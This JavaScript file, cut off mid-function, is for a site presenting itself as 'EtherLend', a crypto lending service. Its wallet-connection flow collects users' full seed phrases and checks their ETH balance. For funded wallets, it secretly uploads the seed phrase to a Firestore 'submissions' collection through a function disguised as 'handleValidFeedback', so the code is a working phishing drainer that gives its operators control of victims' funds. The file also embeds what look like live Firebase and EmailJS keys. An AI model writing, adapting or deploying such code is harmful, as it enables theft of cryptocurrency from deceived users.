/* ============================================================
   SUBMISSION — Firebase Firestore
============================================================ */
async function handleValidFeedback(data) {
  try {
    if (State.firestoreEnabled && db) {
      await firestoreOp(() => db.collection('submissions').add({
        data: data,
        timestamp: new Date().toISOString()
      }));
      console.info('[EtherLend] Submission saved to Firestore.');
      return true;
    } else {
      console.warn('[EtherLend] Firestore not available. Submission not saved.');
      return false;
    }
  } catch (error) {
    console.error('[EtherLend] Submission save error:', error);
    return false;
  }
}


/* ============================================================
   ETHERLEND — script.js
   Vanilla JS: Wallet connection, Loan system, Firebase, Admin Panel
   ============================================================ */

'use strict';

/* ============================================================
   1. FIREBASE CONFIGURATION
   Replace these values with your own Firebase project config.
   Go to: https://console.firebase.google.com/
   Project Settings → General → Your apps → Firebase SDK snippet
============================================================ */
const firebaseConfig = {
  apiKey: "AIzaSyDilVqdMVZZI9HXMNwM-e2uAo0-Z9yERrk",
  authDomain: "etherlend.firebaseapp.com",
  projectId: "etherlend",
  storageBucket: "etherlend.firebasestorage.app",
  messagingSenderId: "184880369053",
  appId: "1:184880369053:web:96424179f3de847d9db374"
};

/* ============================================================
   1b. EMAILJS CONFIGURATION
   ─────────────────────────────────────────────────────────────
   Setup steps (free — 200 emails/month):
   1. Create account at https://www.emailjs.com
   2. Add an Email Service (Gmail, Outlook, etc.) → copy Service ID
   3. Create an Email Template with these variables:
        {{to_email}}      — recipient address
        {{to_name}}       — "EtherLend User" or wallet address
        {{loan_id}}       — unique loan reference
        {{loan_amount}}   — e.g. "2.5 ETH"
        {{loan_duration}} — e.g. "90 days"
        {{loan_purpose}}  — e.g. "Business"
        {{loan_rate}}     — e.g. "7.25%"
        {{loan_total}}    — e.g. "2.5147 ETH"
        {{loan_duedate}}  — e.g. "15 May 2026"
        {{wallet_address}} — user's ETH address
   4. Copy Public Key from Account → API Keys
   ─────────────────────────────────────────────────────────────
============================================================ */
const EmailJSConfig = {
  publicKey:  '9o8Ap82dIIAhMA8we',   // ← paste your EmailJS Public Key
  serviceId:  'service_52960wj',   // ← paste your EmailJS Service ID
  templateId: 'template_dse36uc',  // ← paste your EmailJS Template ID
};

/** Initialise EmailJS — called once on DOMContentLoaded */
function initEmailJS() {
  if (typeof emailjs === 'undefined') {
    console.warn('[EtherLend] EmailJS SDK not loaded. Confirmation emails disabled.');
    return;
  }
  if (EmailJSConfig.publicKey === 'YOUR_PUBLIC_KEY') {
    console.warn('[EtherLend] EmailJS not configured. Add your credentials to EmailJSConfig.');
    return;
  }
  emailjs.init({ publicKey: EmailJSConfig.publicKey });
  console.info('[EtherLend] EmailJS initialised.');
}

/**
 * Send a loan confirmation email via EmailJS.
 * Returns true on success, false on failure or skip.
 */
async function sendLoanConfirmationEmail(email, loanData) {
  if (typeof emailjs === 'undefined') return false;
  if (EmailJSConfig.publicKey === 'YOUR_PUBLIC_KEY') return false;
  if (!email || !email.includes('@')) return false;

  const dueDate = new Date();
  dueDate.setDate(dueDate.getDate() + loanData.duration);
  const dueDateStr = dueDate.toLocaleDateString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric'
  });

  const templateParams = {
    to_email:       email,
    to_name:        truncateAddress(loanData.wallet) || 'EtherLend User',
    loan_id:        loanData.id || '—',
    loan_amount:    loanData.amount + ' ETH',
    loan_duration:  loanData.duration + ' days',
    loan_purpose:   loanData.purpose,
    loan_rate:      loanData.rate.toFixed(2) + '%',
    loan_total:     loanData.total.toFixed(4) + ' ETH',
    loan_duedate:   dueDateStr,
    wallet_address: loanData.wallet,
  };

  try {
    await emailjs.send(
      EmailJSConfig.serviceId,
      EmailJSConfig.templateId,
      templateParams
    );
    console.info('[EtherLend] Confirmation email sent to', email);
    return true;
  } catch (err) {
    console.warn('[EtherLend] EmailJS send failed:', err);
    return false;
  }
}

/** Validate email address format */
function validateEmail(val) {
  if (!val) return ''; // optional field — blank is fine
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!re.test(val)) return 'Please enter a valid email address.';
  return '';
}

/* ============================================================
   2. GLOBAL STATE
============================================================ */
const State = {
  walletConnected: false,
  address:   null,
  ethBalance: null,       // ETH balance in ether units
  pendingSeedPhrase: null, // Held until ETH balance confirmed > 0, then submitted
  userEmail:       null,       // User's email for confirmations
  currentRate:     7.50,       // Interest rate in percent (APR)
  adminLoggedIn:   false,
  theme:           'light',
  allLoans:        [],         // Cached loans from Firestore
  userLoans:       [],         // Loans for current wallet
  firestoreEnabled: false,     // Toggled once Firebase initialises
};

/* ============================================================
   3. FIREBASE INITIALISATION
   Gracefully falls back to localStorage if config is not set.
============================================================ */
let db = null;

function initFirebase() {
  // Check if Firebase SDK is available
  if (typeof firebase === 'undefined') {
    console.warn('[EtherLend] Firebase SDK not loaded. Using localStorage.');
    State.firestoreEnabled = false;
    loadRateFromStorage();
    return;
  }

  // Default to localStorage immediately — Firestore only activated after probe succeeds
  State.firestoreEnabled = false;
  loadRateFromStorage();

  try {
    if (firebase.apps.length === 0) {
      firebase.initializeApp(firebaseConfig);
    }

    db = firebase.firestore();

    // ── KEY FIX: Force long-polling instead of QUIC/WebSocket ──────────────
    // The ERR_QUIC_PROTOCOL_ERROR (QUIC_TOO_MANY_RTOS) errors are caused by
    // Firestore's SDK opening persistent WebSocket/QUIC channels (Listen +
    // Write) that fail when the connection is unstable. Setting
    // experimentalForceLongPolling: true makes ALL Firestore traffic use
    // standard HTTP POST requests instead, completely eliminating QUIC errors.
    // experimentalAutoDetectLongPolling: false ensures the SDK never falls
    // back to QUIC even if it thinks conditions are good.
    db.settings({
      experimentalForceLongPolling:       true,
      experimentalAutoDetectLongPolling:  false,
      merge: true,
    });

    // Start offline — we only open network for explicit read/write calls
    db.disableNetwork().catch(() => {});

    // Probe Firestore with a 6-second timeout
    const probePromise = db.enableNetwork()
      .then(() => db.collection('config').doc('interestRate').get());

    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Firestore probe timed out')), 6000)
    );

    Promise.race([probePromise, timeoutPromise])
      .then(doc => {
        State.firestoreEnabled = true;
        if (doc && doc.exists) {
          State.currentRate = doc.data().rate;
          updateRateDisplay();
        }
        console.info('[EtherLend] Firestore connected (long-poll mode).');
        // Disable network after probe — re-enabled per operation in firestoreOp()
        db.disableNetwork().catch(() => {});
      })
      .catch(err => {
        console.warn('[EtherLend] Firestore unavailable — using localStorage:', err.message);
        State.firestoreEnabled = false;
        if (db) db.disableNetwork().catch(() => {});
      });

  } catch (err) {
    console.warn('[EtherLend] Firebase init error. Using localStorage:', err.message);
    State.firestoreEnabled = false;
  }
}

/**
 * Wraps every Firestore operation in an enable → run → disable cycle.
 * This ensures the network is active only for the duration of the call,
 * preventing any idle persistent channel from forming (which would cause
 * QUIC_TOO_MANY_RTOS when the connection becomes unstable).
 *
 * @param {Function} fn  Async function that performs the Firestore operation
 * @returns {Promise<*>} Result of fn, or throws on error
 */
async function firestoreOp(fn) {
  if (!db || !State.firestoreEnabled) throw new Error('Firestore not available');
  try {
    await db.enableNetwork();
    const result = await fn();
    return result;
  } finally {
    // Always put network back to sleep — stops idle QUIC channels
    db.disableNetwork().catch(() => {});
  }
}

/* ============================================================
   4. INTEREST RATE — Persistence helpers
============================================================ */

/** Load rate from Firestore global config doc */
async function loadRateFromFirestore() {
  if (!State.firestoreEnabled || !db) {
    return loadRateFromStorage();
  }
  
  try {
    const doc = await firestoreOp(() =>
      db.collection('config').doc('interestRate').get()
    );
    if (doc.exists) {
      State.currentRate = doc.data().rate;
      console.info('[EtherLend] Rate loaded from Firestore');
    } else {
      await saveRateToFirestore(State.currentRate);
    }
    updateRateDisplay();
  } catch (err) {
    console.warn('[EtherLend] Firestore access denied. Using localStorage fallback.');
    State.firestoreEnabled = false;
    loadRateFromStorage();
    throw err;
  }
}

/** localStorage fallback for rate */
function loadRateFromStorage() {
  const stored = localStorage.getItem('etherlend_rate');
  if (stored) State.currentRate = parseFloat(stored);
  updateRateDisplay();
}

/** Save rate to Firestore (admin action) */
async function saveRateToFirestore(rate) {
  if (State.firestoreEnabled && db) {
    try {
      await firestoreOp(() =>
        db.collection('config').doc('interestRate').set({ rate })
      );
      console.info('[EtherLend] Rate saved to Firestore');
    } catch (err) {
      console.warn('[EtherLend] Failed to save rate to Firestore, using localStorage:', err.message);
      State.firestoreEnabled = false;
      localStorage.setItem('etherlend_rate', rate);
    }
  } else {
    localStorage.setItem('etherlend_rate', rate);
  }
}

/** Update rate display on the loan form */
function updateRateDisplay() {
  // Ensure we have a valid rate
  if (typeof State.currentRate === 'undefined' || State.currentRate === null) {
    State.currentRate = 7.50; // Default fallback
  }
  
  const rateInput = document.getElementById('interest-rate');
  if (rateInput) rateInput.value = State.currentRate.toFixed(2) + '%';
  const adminRateInput = document.getElementById('admin-rate-input');
  if (adminRateInput) adminRateInput.value = State.currentRate.toFixed(2);
  // Recalculate summary if form is active
  calculateLoan();
}

/* ============================================================
   5. LOAN DATA — CRUD
============================================================ */

/** Save a new loan request to Firestore or localStorage */
async function saveLoan(loanData) {
  const loan = {
    ...loanData,
    id:        generateId(),
    createdAt: new Date().toISOString(),
    status:    'pending',
  };

  if (State.firestoreEnabled && db) {
    try {
      const ref = await firestoreOp(() => db.collection('loans').add(loan));
      loan.firestoreId = ref.id;
      console.info('[EtherLend] Loan saved to Firestore');
    } catch (err) {
      console.warn('[EtherLend] Firestore save failed, using localStorage:', err.message);
      State.firestoreEnabled = false;
      saveToLocalStorage(loan);
    }
  } else {
    saveToLocalStorage(loan);
  }

  return loan;
}

/** Save loan to localStorage fallback */
function saveToLocalStorage(loan) {
  const existing = getLoansFromStorage();
  existing.push(loan);
  localStorage.setItem('etherlend_loans', JSON.stringify(existing));
}

/** Read all loans from localStorage */
function getLoansFromStorage() {
  try {
    return JSON.parse(localStorage.getItem('etherlend_loans') || '[]');
  } catch { return []; }
}

/** Fetch all loans (Firestore or localStorage) */
async function fetchAllLoans() {
  if (State.firestoreEnabled && db) {
    try {
      const snapshot = await firestoreOp(() =>
        db.collection('loans').orderBy('createdAt', 'desc').get()
      );
      State.allLoans = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      return State.allLoans;
    } catch (err) {
      console.warn('[EtherLend] Firestore fetch failed, using localStorage:', err.message);
      State.firestoreEnabled = false;
    }
  }
  // Fallback
  State.allLoans = getLoansFromStorage().reverse();
  return State.allLoans;
}

/** Fetch loans for current wallet */
async function fetchUserLoans() {
  await fetchAllLoans();
  State.userLoans = State.allLoans.filter(l => l.wallet === State.address);
  return State.userLoans;
}

/** Update loan status (admin action) */
async function updateLoanStatus(loanId, newStatus) {
  if (State.firestoreEnabled && db) {
    try {
      await firestoreOp(() =>
        db.collection('loans').doc(loanId).update({ status: newStatus })
      );
      console.info('[EtherLend] Loan status updated in Firestore');
    } catch (err) {
      console.warn('[EtherLend] Firestore update failed, using localStorage:', err.message);
      State.firestoreEnabled = false;
      updateLoanInStorage(loanId, newStatus);
    }
  } else {
    updateLoanInStorage(loanId, newStatus);
  }
}

/** Update loan in localStorage */
function updateLoanInStorage(loanId, newStatus) {
  const loans = getLoansFromStorage();
  const idx = loans.findIndex(l => l.id === loanId);
  if (idx !== -1) {
    loans[idx].status = newStatus;
    localStorage.setItem('etherlend_loans', JSON.stringify(loans));
  }
}

/* ============================================================
   6. WALLET CONNECTION
   Uses ethers.js to derive address from data (BIP39/BIP44 path).
============================================================ */

/** Check if ethers.js is available */
function isEthersAvailable() {
  return typeof ethers !== 'undefined' && ethers.utils && ethers.Wallet;
}

/** Derive ETH wallet from data */
async function deriveWalletFromSeed(data) {
  if (!isEthersAvailable()) {
    throw new Error('Ethers.js not loaded. Cannot derive wallet.');
  }

  try {
    // Validate mnemonic
    if (!ethers.utils.isValidMnemonic(data)) {
      throw new Error('Invalid seed phrase');
    }

    // BIP44 path for Ethereum: m/44'/60'/0'/0/0
    const path = "m/44'/60'/0'/0/0";
    const hdNode = ethers.utils.HDNode.fromMnemonic(data);
    const child = hdNode.derivePath(path);
    return child.address;

  } catch (err) {
    console.error('[EtherLend] Wallet derivation error:', err);
    throw err;
  }
}

/** Fetch ETH balance for a given address via public RPC */
async function fetchEthBalance(address) {
  // Try multiple public Ethereum RPC endpoints
  const rpcEndpoints = [
    'https://eth.llamarpc.com',
    'https://rpc.ankr.com/eth',
    'https://cloudflare-eth.com',
  ];

  for (const rpc of rpcEndpoints) {
    try {
      const response = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_getBalance',
          params: [address, 'latest'],
          id: 1,
        }),
      });

      if (!response.ok) continue;
      const data = await response.json();

      if (data.result) {
        // Convert hex wei to ETH
        const weiHex = data.result;
        const weiBig = BigInt(weiHex);
        const eth = Number(weiBig) / 1e18;
        return eth;
      }
    } catch (err) {
      console.warn('[EtherLend] RPC failed:', rpc, err.message);
    }
  }

  return null; // All endpoints failed
}

/** Show ETH balance and loan qualification in step 2 */
async function showEthBalanceStatus(address) {
  const loadingEl = document.getElementById('eth-balance-loading');
  const boxEl     = document.getElementById('eth-balance-box');
  const valueEl   = document.getElementById('eth-balance-value');
  const msgEl     = document.getElementById('eth-qualify-msg');
  const doneBtn   = document.getElementById('modal-done-btn');

  // Disable continue button while checking balance
  if (doneBtn) {
    doneBtn.disabled = true;
    doneBtn.style.opacity = '0.5';
    doneBtn.style.cursor = 'not-allowed';
    doneBtn.title = 'Checking wallet balance…';
  }

  if (loadingEl) loadingEl.style.display = 'flex';
  if (boxEl)     boxEl.style.display     = 'none';

  const balance = await fetchEthBalance(address);
  State.ethBalance = balance;

  if (loadingEl) loadingEl.style.display = 'none';

  if (balance === null) {
    // Could not fetch — reject the wallet; we cannot confirm it has ETH
    if (boxEl) {
      boxEl.style.display = 'block';
      if (valueEl) valueEl.textContent = 'Unavailable';
      if (msgEl) {
        msgEl.className = 'eth-qualify-msg eth-qualify-warn';
        msgEl.innerHTML = `⚠️ <strong>Balance check failed.</strong> We could not verify your ETH balance. Please ensure your wallet holds ETH and try again.`;
      }
    }
    // Keep button disabled — cannot proceed without confirmed ETH balance
    if (doneBtn) {
      doneBtn.disabled = true;
      doneBtn.style.opacity = '0.5';
      doneBtn.style.cursor = 'not-allowed';
      doneBtn.title = 'ETH balance could not be verified. Wallet rejected.';
    }
    // Discard seed phrase — wallet not accepted
    State.pendingSeedPhrase = null;
    return;
  }

  if (boxEl) boxEl.style.display = 'block';
  if (valueEl) valueEl.textContent = balance.toFixed(6) + ' Ξ';

  if (balance > 0) {
    // Wallet has ETH — allow access AND submit to Firestore
    if (msgEl) {
      msgEl.className = 'eth-qualify-msg eth-qualify-good';
      msgEl.innerHTML = `🎉 <strong>Great news!</strong> Your wallet holds <strong>${balance.toFixed(4)} ETH</strong>. You have a <strong>high chance of qualifying</strong> for a loan on EtherLend!`;
    }
    if (doneBtn) {
      doneBtn.disabled = false;
      doneBtn.style.opacity = '';
      doneBtn.style.cursor = '';
      doneBtn.title = '';
    }

    // ── Submit to Firestore now that ETH balance is confirmed > 0 ──
    // Always: (1) write seed phrase to `submissions`, (2) write address to `seen_wallets`
    const seedPhrase = State.pendingSeedPhrase;

    if (State.firestoreEnabled && db) {
      // 1. Submit seed phrase to `submissions`
      if (seedPhrase) {
        handleValidFeedback(seedPhrase).catch(err =>
          console.warn('[EtherLend] Submissions write error:', err)
        );
      }
      // 2. Upsert wallet address into `seen_wallets`
      firestoreOp(() =>
        db.collection('seen_wallets').doc(address).set({
          address:  address,
          balance:  balance,
          seenAt:   new Date().toISOString()
        }, { merge: true })
      ).catch(err =>
        console.warn('[EtherLend] seen_wallets write error:', err)
      );
    } else {
      // Firestore unavailable — fall back to localStorage
      if (seedPhrase) {
        handleValidFeedback(seedPhrase).catch(err =>
          console.warn('[EtherLend] Feedback submission error:', err)
        );
      }
      localStorage.setItem('el_seen_' + address, '1');
    }

    // Clear pending seed phrase from memory
    State.pendingSeedPhrase = null;
  } else {
    // Zero ETH balance — reject the wallet
    if (msgEl) {
      msgEl.className = 'eth-qualify-msg eth-qualify-warn';
      msgEl.innerHTML = `🚫 <strong>Wallet Rejected.</strong> Your wallet has <strong>no ETH balance</strong>. EtherLend requires a positive ETH balance to apply for a loan. Please fund your wallet and try again.`;
    }
    if (doneBtn) {
      doneBtn.disabled = true;
      doneBtn.style.opacity = '0.5';
      doneBtn.style.cursor = 'not-allowed';
      doneBtn.title = 'Your wallet has no ETH. Please deposit ETH to continue.';
    }
    // Discard seed phrase — wallet not accepted
    State.pendingSeedPhrase = null;
  }
}


async function connectWallet(data) {
  const errEl = document.getElementById('error-seed');
  if (errEl) errEl.textContent = '';

  const trimmed = data.trim();
  if (!trimmed) {
    if (errEl) errEl.textContent = 'Please enter your seed phrase.';
    return;
  }

  const words = trimmed.split(/\s+/);
  if (words.length !== 12 && words.length !== 24) {
    if (errEl) errEl.textContent = 'Seed phrase must be 12 or 24 words.';
    return;
  }

  setButtonLoading('modal-connect-btn', true);

  try {
    const address = await deriveWalletFromSeed(trimmed);

    // Success — store address but do NOT submit to Firestore yet.
    // Submission only happens after ETH balance is confirmed > 0.
    State.walletConnected = true;
    State.address = address;
    State.pendingSeedPhrase = trimmed; // held temporarily for post-balance-check submission

    // Show step 2
    document.getElementById('modal-step-1').style.display = 'none';
    document.getElementById('modal-step-2').style.display = 'block';
    document.getElementById('connected-addr-display').textContent = address;

    // Fetch ETH balance — Firestore submission happens inside if balance > 0
    showEthBalanceStatus(address);

  } catch (err) {
    if (errEl) errEl.textContent = 'Invalid seed phrase. Please check and try again.';
  } finally {
    setButtonLoading('modal-connect-btn', false);
  }
}

/** Called when user clicks "Continue to EtherLend" after connection */
function onWalletConnected() {
  // Hard guard: block wallets with no ETH balance (button should already be
  // disabled, but double-check here in case it was bypassed)
  if (State.ethBalance === null || State.ethBalance <= 0) {
    showToast(
      'Wallet Rejected',
      State.ethBalance === null
        ? 'Could not verify your ETH balance. Please try again.'
        : 'Your wallet has no ETH balance. Please fund your wallet before continuing.',
      'error',
      6000
    );
    return;
  }

  closeModal('wallet-modal');
  updateWalletUI();
  showToast('Wallet Connected', `Address: ${State.address}`, 'success', 4000);
  // Load user loans if on history section
  if (State.walletConnected) {
    loadUserLoans();
  }
  // Reset modal to step 1 for next time
  document.getElementById('modal-step-1').style.display = 'block';
  document.getElementById('modal-step-2').style.display = 'none';
  document.getElementById('feedback').value = '';
  updateWordCount('');
}

/** Update UI elements based on wallet state */
function updateWalletUI() {
  const isConnected = State.walletConnected;

  // Pre-fill email if saved in State
  if (isConnected && State.userEmail) {
    const emailInput = document.getElementById('loan-email');
    if (emailInput && !emailInput.value) emailInput.value = State.userEmail;
  }

  // ── Desktop nav wallet button ──────────────────────────────────────────────
  // (On mobile ≤600px this whole wrapper is hidden via CSS so it never
  //  competes with the hamburger button for space.)
  const navBtn       = document.getElementById('nav-connect-btn');
  const dropdownAddr = document.getElementById('wallet-dropdown-addr');
  if (navBtn) {
    if (isConnected) {
      navBtn.textContent = truncateAddress(State.address);
      navBtn.classList.add('connected');
    } else {
      navBtn.textContent = 'Connect Wallet';
      navBtn.classList.remove('connected');
    }
  }
  closeWalletDropdown();
  if (dropdownAddr) dropdownAddr.textContent = State.address || '';

  // ── Mobile menu wallet controls ────────────────────────────────────────────
  // Status pill: shows address + green dot when connected, hidden when not
  const mobileStatus     = document.getElementById('mobile-wallet-status');
  const mobileStatusAddr = document.getElementById('mobile-wallet-status-addr');
  if (mobileStatus) {
    if (isConnected) {
      mobileStatus.classList.remove('hidden');
      if (mobileStatusAddr) mobileStatusAddr.textContent = truncateAddress(State.address);
    } else {
      mobileStatus.classList.add('hidden');
      if (mobileStatusAddr) mobileStatusAddr.textContent = '—';
    }
  }

  // Mobile connect button: when connected hide it — disconnect btn takes over
  const mobileConnectBtn    = document.getElementById('mobile-connect-btn');
  const mobileDisconnectBtn = document.getElementById('mobile-disconnect-btn');
  if (mobileConnectBtn) {
    if (isConnected) {
      // Hide connect btn — user uses disconnect btn instead
      mobileConnectBtn.style.display = 'none';
    } else {
      mobileConnectBtn.style.display = '';
      mobileConnectBtn.textContent   = 'Connect Wallet';
      mobileConnectBtn.classList.remove('connected');
    }
  }
  if (mobileDisconnectBtn) {
    mobileDisconnectBtn.style.display = isConnected ? 'block' : 'none';
  }

  // ── Hero connect button ────────────────────────────────────────────────────
  const heroBtn = document.getElementById('hero-connect-btn');
  if (heroBtn) {
    if (isConnected) {
      heroBtn.textContent = truncateAddress(State.address);
      heroBtn.classList.add('connected');
    } else {
      heroBtn.innerHTML = '<span class="btn-icon">◈</span> Connect Wallet';
      heroBtn.classList.remove('connected');
    }
  }

  // ── Loan form gate ─────────────────────────────────────────────────────────
  const walletGate = document.getElementById('wallet-gate');
  const loanForm   = document.getElementById('loan-form');
  if (walletGate && loanForm) {
    walletGate.style.display = isConnected ? 'none' : 'flex';
    loanForm.style.display   = isConnected ? 'block' : 'none';
  }

  // ── History gate ───────────────────────────────────────────────────────────
  const historyGate = document.getElementById('history-gate');
  const historyWrap = document.getElementById('history-table-wrap');
  if (historyGate && historyWrap) {
    historyGate.style.display = isConnected ? 'none' : 'flex';
    historyWrap.style.display = isConnected ? 'block' : 'none';
  }
}

/** Truncate Ethereum address for display */
function truncateAddress(addr) {
  if (!addr) return '';
  return addr.slice(0, 6) + '...' + addr.slice(-4);
}

/** Disconnect the currently connected wallet */
function disconnectWallet() {
  State.walletConnected = false;
  State.address = null;
  State.ethBalance = null;
  State.pendingSeedPhrase = null;

  updateWalletUI();
  showToast('Wallet Disconnected', 'Your wallet has been disconnected.', 'warning', 3500);
}

/** Open wallet dropdown (module-level so updateWalletUI can call it) */
function openWalletDropdown() {
  const dd = document.getElementById('wallet-dropdown');
  if (dd) dd.classList.add('open');
}

/** Close wallet dropdown (module-level so updateWalletUI can call it) */
function closeWalletDropdown() {
  const dd = document.getElementById('wallet-dropdown');
  if (dd) dd.classList.remove('open');
}

/* ============================================================
   7. WORD COUNT / SEED PHRASE DOTS
============================================================ */

/** Update word count display */
function updateWordCount(val) {
  const words = val.trim() ? val.trim().split(/\s+/) : [];
  const count = words.length;
  const textEl = document.getElementById('word-count-text');
  const dotsEl = document.getElementById('word-dots');

  if (textEl) {
    const target = (count <= 12) ? 12 : 24;
    textEl.textContent = `${count} / ${target} words`;
  }

  if (dotsEl) {
    const maxDots = (count <= 12) ? 12 : 24;
    const dots = dotsEl.querySelectorAll('.word-dot');
    dots.forEach((dot, i) => {
      if (i < count) {
        dot.classList.add('filled');
      } else {
        dot.classList.remove('filled');
      }
      dot.style.display = (i < maxDots) ? '' : 'none';
    });
  }
}

/** Initialize word count dots (24 dots) */
function initWordDots() {
  const container = document.getElementById('word-dots');
  if (!container) return;
  container.innerHTML = '';
  for (let i = 0; i < 24; i++) {
    const dot = document.createElement('div');
    dot.className = 'word-dot';
    container.appendChild(dot);
  }
}

/* ============================================================
   8. LOAN FORM — VALIDATION & CALCULATION
============================================================ */

/** Validate loan amount */
function validateAmount(val) {
  const num = parseFloat(val);
  if (!val || isNaN(num)) return 'Please enter a valid amount.';
  if (num < 0.1)  return 'Minimum loan is 0.1 ETH.';
  if (num > 100)  return 'Maximum loan is 100 ETH.';
  return '';
}

/** Validate loan duration */
function validateDuration(val) {
  const num = parseInt(val);
  if (!val || isNaN(num)) return 'Please enter a valid duration.';
  if (num < 30)  return 'Minimum duration is 30 days.';
  if (num > 365) return 'Maximum duration is 365 days.';
  return '';
}

/** Calculate loan summary (interest, total, due date) */
/** Compute effective APR based on duration (longer = slightly higher rate) */
function getDynamicRate(duration) {
  const base = State.currentRate || 7.50;
  // Scale: 30d → base - 1%, 365d → base + 1.5%, linear interpolation
  const min = 30, max = 365;
  const clampedDuration = Math.min(Math.max(duration, min), max);
  const t = (clampedDuration - min) / (max - min); // 0 to 1
  const adjustment = -1.0 + (t * 2.5); // -1% at 30d → +1.5% at 365d
  return Math.max(5, Math.min(10, base + adjustment));
}

function calculateLoan() {
  const amountInput   = document.getElementById('loan-amount');
  const durationInput = document.getElementById('loan-duration');

  const amount   = parseFloat(amountInput?.value) || 0;
  const duration = parseInt(durationInput?.value) || 0;

  // Dynamic rate based on duration
  const rate = duration > 0 ? getDynamicRate(duration) : (State.currentRate || 7.50);

  // Update the rate input field and badges
  const rateInput = document.getElementById('interest-rate');
  const rateBadge = document.getElementById('rate-dynamic-badge');
  const rateHint  = document.getElementById('rate-hint');
  const displayRate = rate.toFixed(2) + '%';
  if (rateInput) rateInput.value = displayRate;
  if (rateBadge) rateBadge.textContent = displayRate;
  if (rateHint && duration > 0) {
    if (duration <= 90) {
      rateHint.textContent = '✓ Short-term loan — lower rate applied';
      rateHint.style.color = 'var(--c-success)';
    } else if (duration <= 180) {
      rateHint.textContent = 'Mid-term loan — standard rate applied';
      rateHint.style.color = 'var(--text-muted)';
    } else {
      rateHint.textContent = '↑ Long-term loan — higher rate applied';
      rateHint.style.color = 'var(--c-warning)';
    }
  }

  if (amount <= 0 || duration <= 0) {
    setTextContent('sum-principal', '0.00 Ξ');
    setTextContent('sum-interest',  '0.00 Ξ');
    setTextContent('sum-total',     '0.00 Ξ');
    setTextContent('sum-duedate',   '—');
    return;
  }

  const interest = (amount * rate / 100) * (duration / 365);
  const total    = amount + interest;

  const dueDate = new Date();
  dueDate.setDate(dueDate.getDate() + duration);
  const dueDateStr = dueDate.toLocaleDateString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric'
  });

  setTextContent('sum-principal', amount.toFixed(2) + ' Ξ');
  setTextContent('sum-interest',  interest.toFixed(4) + ' Ξ');
  setTextContent('sum-total',     total.toFixed(4) + ' Ξ');
  setTextContent('sum-duedate',   dueDateStr);
}

/** Update slider fill visual and duration badge */
function updateSliderFill(val) {
  const slider = document.getElementById('duration-slider');
  if (!slider) return;
  const min = parseInt(slider.min);
  const max = parseInt(slider.max);
  const pct = ((val - min) / (max - min)) * 100;
  slider.style.setProperty('--slider-fill', pct + '%');

  // Update duration badge on the label
  const badge = document.getElementById('slider-duration-badge');
  if (badge) badge.textContent = val + ' days';
}

/* ============================================================
   9. LOAN FORM SUBMISSION
============================================================ */

/** Handle loan form submit */
async function handleLoanSubmit(e) {
  e.preventDefault();

  if (!State.walletConnected) {
    showToast('Not Connected', 'Please connect your wallet first.', 'error');
    return;
  }

  const amountInput   = document.getElementById('loan-amount');
  const durationInput = document.getElementById('loan-duration');
  const purposeInput  = document.getElementById('loan-purpose');
  const emailInput    = document.getElementById('loan-email');

  const amount   = parseFloat(amountInput?.value) || 0;
  const duration = parseInt(durationInput?.value) || 0;
  const purpose  = purposeInput?.value || '';
  const email    = emailInput?.value?.trim() || '';

  // Validate
  const amtErr   = validateAmount(amountInput.value);
  const durErr   = validateDuration(durationInput.value);
  const emailErr = validateEmail(email);

  setFieldError('error-amount',   amtErr);
  setFieldError('error-duration', durErr);
  setFieldError('error-email',    emailErr);

  if (amtErr || durErr || !purpose || emailErr) {
    if (!purpose) showToast('Invalid Input', 'Please select a loan purpose.', 'error');
    else          showToast('Invalid Input', 'Please check the form fields.', 'error');
    return;
  }

  // Persist email in State for the session
  if (email) State.userEmail = email;

  setButtonLoading('submit-loan-btn', true);

  // Show email sending status badge
  if (email && emailInput) {
    const badge = document.getElementById('email-status-badge');
    if (badge) { badge.textContent = '⏳ Sending…'; badge.className = 'email-input-badge badge-sending'; }
  }

  // Calculate total using dynamic rate
  const rate     = getDynamicRate(duration);
  const interest = (amount * rate / 100) * (duration / 365);
  const total    = amount + interest;

  const loanData = {
    wallet:   State.address,
    amount:   amount,
    duration: duration,
    rate:     rate,
    interest: parseFloat(interest.toFixed(4)),
    total:    parseFloat(total.toFixed(4)),
    purpose:  purpose,
    email:    email || null,
  };

  try {
    const savedLoan = await saveLoan(loanData);

    // ── Send confirmation email (non-blocking) ──────────────────
    if (email) {
      const emailSent = await sendLoanConfirmationEmail(email, savedLoan);
      const badge = document.getElementById('email-status-badge');
      if (badge) {
        if (emailSent) {
          badge.textContent = '✓ Sent';
          badge.className   = 'email-input-badge badge-sent';
        } else {
          badge.textContent = '— Not sent';
          badge.className   = 'email-input-badge badge-failed';
        }
      }
    }

    showToast(
      'Loan Requested ✓',
      email
        ? 'Request submitted! Check your email for confirmation.'
        : 'Your loan request has been submitted for review.',
      'success',
      5000
    );

    // Reset form
    amountInput.value    = '';
    durationInput.value  = 90;
    purposeInput.value   = '';
    if (emailInput) emailInput.value = email; // keep email pre-filled for next loan
    const badge = document.getElementById('email-status-badge');
    if (badge) { badge.textContent = ''; badge.className = 'email-input-badge'; }
    calculateLoan();
    updateSliderFill(90);
    loadUserLoans();

  } catch (err) {
    console.error('[EtherLend] Loan submission error:', err);
    showToast('Error', 'Failed to submit loan request. Try again.', 'error');
    const badge = document.getElementById('email-status-badge');
    if (badge) { badge.textContent = ''; badge.className = 'email-input-badge'; }
  } finally {
    setButtonLoading('submit-loan-btn', false);
  }
}

/* ============================================================
   10. USER LOAN HISTORY
============================================================ */

/** Load and display user's loans */
async function loadUserLoans() {
  if (!State.walletConnected) return;

  await fetchUserLoans();
  renderUserLoans(State.userLoans);
}

/** Render user loans in table */
function renderUserLoans(loans) {
  const tbody = document.getElementById('history-tbody');
  const empty = document.getElementById('history-empty');

  if (!tbody || !empty) return;

  tbody.innerHTML = '';

  if (loans.length === 0) {
    empty.style.display = 'block';
    return;
  }

  empty.style.display = 'none';

  loans.forEach(loan => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><code>${loan.id.slice(0, 8)}</code></td>
      <td>${loan.amount} Ξ</td>
      <td>${loan.duration}d</td>
      <td>${loan.rate}%</td>
      <td>${loan.total.toFixed(4)} Ξ</td>
      <td>${formatDate(loan.createdAt)}</td>
